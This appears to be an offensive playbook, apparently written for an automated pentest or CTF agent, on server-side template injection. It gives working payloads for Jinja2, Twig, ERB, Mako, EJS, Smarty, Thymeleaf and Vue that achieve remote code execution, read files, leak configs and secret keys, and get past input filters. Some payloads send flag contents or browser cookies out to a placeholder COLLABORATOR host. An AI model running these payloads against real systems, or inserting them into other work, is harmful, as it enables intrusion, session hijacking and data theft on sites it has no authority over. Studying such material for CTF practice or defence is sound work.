# Server-Side Template Injection (SSTI)

## Trigger

Load SSTI methodology when ANY of these signals appear:
- Template engine indicators in HTTP headers or HTML: `X-Powered-By: Jinja2`, `X-Generator: Twig`, comments containing `<!-- {%% -->`, `<!-- {{ -->`, or rendered output reflects user input with template syntax visible
- Technology fingerprint: Flask/Django (Jinja2), Symfony/Laravel (Twig), Ruby on Rails/Sinatra (ERB), Python+Mako, Node.js+EJS, Go+Pongo2, Spring Boot+Thymeleaf
- Error messages: `TemplateSyntaxError`, `UndefinedError`, `TemplateNotFound`, `Twig_Error_Syntax`
- User input reflected in rendered output without encoding: `Hello {user_input}` style patterns
- File upload that renders as a template, file preview functionality, PDF generation from templates
- URL parameters, cookies, or headers that appear verbatim in the response body

## Attack Surface

- Any parameter (GET, POST, cookie, header) that appears in the rendered output
- Template preview endpoints: `/preview`, `/render`, `/generate`, `/api/templates`
- Error pages that interpolate the URL path or query string
- File upload systems where uploaded content is rendered as a template
- Email template rendering where user-controlled fields appear in email HTML
- PDF/WYSIWYG document generators that accept template syntax

## Decision Tree

```
1. Probe → Inject {{7*7}} (or ${7*7}, #{7*7}) in ALL input vectors
   ├─ Response contains "49" → Template engine evaluates arithmetic
   │     └─ Identify engine via {{7*'7'}} probe
   │           ├─ Returns "7777777" (string repeat) → Twig
   │           ├─ Returns "49" (numeric multiply) → Jinja2/Mako
   │           └─ Error → other engine, try ${7*7}, #{7*7}
   └─ No numeric output → try blind sleep probes
         └─ {{''.__class__.__mro__[1].__subclasses__()}} style probes

2. Identify → Distinguish engine (see Techniques section per engine)

3. Escalate → Read config → Read files → RCE
```

## Techniques

### Probe Payloads (Engine-Agnostic)

```
{{7*7}}           # Arithmetic evaluation
${7*7}            # Mako / Vue.js template literal
#{7*7}            # Ruby ERB / Thymeleaf
{{7*'7'}}         # Distinguisher: Twig=7777777, Jinja2/Mako=49
{{config}}        # Flask config dump (Jinja2)
{{_self}}         # Twig environment object
```

### Jinja2 (Python/Flask)

```python
# Config leak
{{config.items()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Class traversal RCE
{{''.__class__.__mro__[1].__subclasses__()}}
# Find subprocess.Popen index, then:
{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()[0]}}

# Via request object (always in Flask context)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Via lipsum / cycler / joiner (builtin Jinja2 globals)
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.__builtins__.exec("import os;os.system('id')")}}
{{joiner.__init__.__globals__.__builtins__['__import__']('os').popen('id').read()}}

# Blind SSTI via sleep
{{''.__class__.__mro__[1].__subclasses__()[X]('sleep 5',shell=True,stdout=-1).communicate()}}

# Blind SSTI via curl callback
{{config.__class__.__init__.__globals__.__builtins__.__import__('os').popen('curl http://COLLABORATOR/$(cat /flag)').read()}}
```

### Twig (PHP/Symfony)

```twig
{# File read #}
{{'/etc/passwd'|file_excerpt(1,30)}}

{# RCE Twig 1.x #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{# RCE Twig 3.x via filter map #}
{{['id']|map('system')|join}}
{{['cat /flag']|map('passthru')|join}}

{# Arbitrary function call #}
{{['ls -la']|map('system')|join}}
```

### ERB (Ruby/Sinatra/Rails)

```ruby
# Basic probe (in cookie or param)
<%= 7*7 %>          # Returns 49

# File read
<%= File.read('/etc/passwd') %>

# Command execution
<%= `id` %>
<%= %x{cat /flag} %>

# Database access via Sequel (Sinatra)
<%= Sequel::DATABASES.first.tables %>
<%= Sequel::DATABASES.first[:players].all %>
```

### Mako (Python)

```python
# Detection
${7*7}

# RCE one-liner
${__import__('os').popen('cat /flag').read()}

# Multi-line block
<%
  import os
  os.popen("id").read()
%>
```

### EJS (Node.js/Express)

```javascript
<%- global.process.mainModule.require('child_process').execSync('id') %>

<%- global.process.env.FLAG %>

<%- global.process.mainModule.require('fs').readFileSync('/flag','utf8') %>
```

### Smarty (PHP)

```php
{CVE-2017-1000480 - template path injection with */ comment breakout}

# URL: ?id=*/echo file_get_contents('/flag');/*
# When template source path is in compiled /* ... */ comment:
#   <?php /* source: /path/to/*/echo file_get_contents('/flag');/* */ ?>
#   The */ closes the comment, code executes, /* reopens a comment

# Via backtick when parens filtered:
*/echo `cat /flag`;/*
```

### Pongo2 / Go Template

```go
{{.ReadFile "/flag.txt"}}

{# Include files #}
{% include "/etc/passwd" %}
{% include "/flag.txt" %}
```

### Vue.js (Constructor Chain RCE)

```javascript
// Client-side: user input in Vue {{ }} template expressions
{{constructor.constructor('return fetch("http://COLLABORATOR/?c="+document.cookie)')()}}

${toString.constructor('document.location="http://COLLABORATOR/?"+document.cookie')()}
```

### Thymeleaf SpEL (Spring Boot)

```text
${T(java.util.Arrays).toString(new java.io.File("/app").list())}

${new java.lang.String(T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File("/app/flag.txt")))}
```

## Bypass

### Quote/String Filter Bypass

```python
# When quotes are blocked, use keyword arguments:
{{player.__dict__.update(power_level=9999999) or player.name}}

# Use bytes() instead of quotes:
{{self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()}}
# bytes([0x6f,0x73]) = "os"

# Use request.args to smuggle strings:
{{self.__init__.__globals__.__builtins__.__import__(request.args.a).popen(request.args.b).read()}}
# ?a=os&b=id
```

### Keyword Filter Bypass (Jinja2)

```python
# String concatenation for blocked words
{{request.__class__.__init__.__globals__.__builtins__.exec("imp"+"ort o"+"s;o"+"s.system('id')")}}

# Using chr() to bypass filters
{{''.__class__.__mro__[1].__subclasses__()[X]('cat /flag'.replace('flag','fl'+'ag'),shell=True,stdout=-1).communicate()}}

# attr() filter bypasses dot-access filter (but does NOT bypass Jinja2 SandboxedEnvironment)
{{''|attr('__cla'+'ss__')}}

# Format string trick for blocked periods
{{'{}'.format.__globals__['__builtins__']['__imp' + 'ort__']('os').system('id')}}
```

### Nested Class Search Automation

```python
# Find subprocess.Popen index automatically
{{''.__class__.__mro__[1].__subclasses__()|
    map('__getitem__', range(200))|
    selectattr('__name__', 'equalto', 'Popen')|
    list}}
```

## Verification

- `{{7*7}}` returns `49` confirms SSTI is active
- Engine-specific probe `{{7*'7'}}` distinguishes Twig from Jinja2
- Blind SSTI: `{{''.__class__.__mro__[1].__subclasses__()[X]('sleep 5',shell=True)}}` causes 5-second delay
- Out-of-band: `{{self.__init__.__globals__.__builtins__.__import__('os').popen('curl COLLABORATOR/$(hostname)')}}` delivers DNS/HTTP callback

## Pitfalls

- Twig 3.x removed `_self.env` access — use `|map('system')` filter chain instead
- Jinja2 `SandboxedEnvironment` blocks class traversal — try `lipsum`, `cycler`, `joiner` globals first
- Single `{{ }}` vs `{% %}`: `{% %}` executes statements (assignments, imports), `{{ }}` evaluates and prints
- Flask `SECRET_KEY` leak via `{{config}}` can enable session forgery even without RCE
- Mako uses `${}` not `{{}}` — easy to miss with Jinja2 probes
- Go `html/template` auto-escapes — use `text/template` for actual injection
- EJS uses `<%-` (unescaped) vs `<%=` (escaped) — look for unescaped render calls
- Vue.js SSTI is client-side — it steals cookies/XSS, not server RCE
- Thymeleaf SpEL requires the `template` preview endpoint or specific `@` processing directives
